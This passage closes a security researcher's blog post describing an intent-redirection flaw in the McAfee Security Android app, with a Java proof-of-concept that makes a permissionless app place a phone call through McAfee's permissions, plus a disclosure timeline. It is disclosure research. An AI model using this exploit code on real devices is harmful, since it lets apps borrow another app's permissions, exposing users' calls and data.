</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">startActivity</span><span class="p">(</span><span class="n">intent2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>The u() method retrieves the current intent with its parameters (extras).
The first extra must be set to &lsquo;TRIGGER:MESSAGING&rsquo; to trigger the vulnerable code.
A StrinkTokenizer is retrieved and reflected in intent2. According to the code, the stringTokenizer is formatted with the &lsquo;SCREEN&rsquo; extra like this : ClassName;extra1_key=value;extra2_key=value.
Finally, the application starts the crafted activity with startActivity(intent2);.
Using this code, it is possible to start arbitrary components with arbitrary extras within the context of the McAfee application.</p>
<h3 id="exploit-payload">Exploit payload</h3>
<p>Here is a simple code example of a malicious application (installed without any permissions) that leverages the McAfee Security: Antivirus VPN application vulnerability discovered to use the &ldquo;android.permission.CALL_PHONE&rdquo; permission and call a random number.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">MA_APP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.wsandroid.suite&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Internal component        </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.mcafee.activitystack.ActivityLauncherActivity&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Intent</span><span class="w"> </span><span class="n">intent3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="s">&#34;android.intent.action.CALL&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">intent3</span><span class="p">.</span><span class="na">setData</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&#34;tel:042-424-242-4&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Intent</span><span class="w"> </span><span class="n">intent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Vulnerable Activity</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">intent</span><span class="p">.</span><span class="na">setClassName</span><span class="p">(</span><span class="n">MA_APP</span><span class="p">,</span><span class="s">&#34;com.mcafee.activity.MainActivity&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">intent</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;TRIGGER&#34;</span><span class="p">,</span><span class="s">&#34;MESSAGING&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">intent</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;SCREEN&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Using a similiar issue in another internal component to directly pass packed intents;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">intent</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;ala:pack_intent&#34;</span><span class="p">,</span><span class="n">intent3</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">startActivity</span><span class="p">(</span><span class="n">intent</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><figure style="text-align:center;">
  <video controls width="60%">
    <source src="https://2dai.github.io/img/blog-attacking-antivirus-1/poc.mp4" type="video/mp4">
    <!-- Fallback / download link -->
    Your browser does not support the video tag. 
    <a href="https://2dai.github.io/img/blog-attacking-antivirus-1/poc.mp4">Download the video</a>.
  </video>
  <figcaption>Fig.2 Simple proof of concept of the vulnerability</figcaption><br>
</figure>
<p>Since the activity is started from the context of the McAfee application, this issue can be leveraged to access Content Providers and all kinds of non-exported components with all the permissions defined by the target.</p>
<p>Again, it&rsquo;s quite surprising for a security product to introduce such bad practices (using so many permissions) and to have a vulnerability of the sort directly in the Main Activity. It shows a certain negligence that really calls into question the usefulness of having certain antivirus applications on mobile phones. However, research done on other McAfee products showed similar results and will warrant another blog post altogether.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>The issue was reported the 15th of December 2021 to the McAfee Security team.</li>
<li>The McAfee Mobile Security 5.x application was EOLed and updated to a new and redesigned mobile v6.x app.</li>
</ul>
<p>This article is also available on the <a href="https://blog.scrt.ch/2023/03/29/attacking-android-antivirus-applications/">SCRT blog</a></p>

                <br>
                
                <p class="back-to-posts"><a href="https://2dai.github.io/blog">Retour aux articles</a></p>
            </div>
            <br>
            <div class="disqus">
                
            </div>
            
        </div>
    </div>
</section>





  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
  

  <script type="text/javascript">
    hljs.initHighlightingOnLoad();
  </script>





</body>
</html>

